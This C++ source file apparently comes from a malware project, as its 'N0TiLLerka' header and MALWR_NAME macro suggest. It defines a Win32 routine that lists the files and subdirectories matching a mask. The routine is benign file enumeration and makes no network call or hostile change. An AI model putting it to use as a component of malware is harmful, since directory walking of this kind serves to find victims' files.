#include "../../../HeaderFiles/N0TiLLerka.h"

BOOL DirectoryIeteratorW(std::wstring wsDir, std::wstring wsMask, std::vector<std::wstring>& vwsDir, std::vector<std::wstring>& vwsFile) {
	WIN32_FIND_DATA w32Fd;
	std::wstring wsW32Fd = wsDir + L"\\" + wsMask;

	HANDLE hFind = FindFirstFile(wsW32Fd.c_str(), &w32Fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (w32Fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (wcscmp(w32Fd.cFileName, L".") != 0 && wcscmp(w32Fd.cFileName, L"..") != 0) {
					vwsDir.push_back(wsDir + L"\\" + w32Fd.cFileName);
				}
			} else {
				vwsFile.push_back(wsDir + L"\\" + w32Fd.cFileName);
			}
		} while (FindNextFile(hFind, &w32Fd));
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Handle to FindFirstFile is invalid", MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
		FindClose(hFind);
		return FALSE;
	}

	FindClose(hFind);
	return TRUE;
}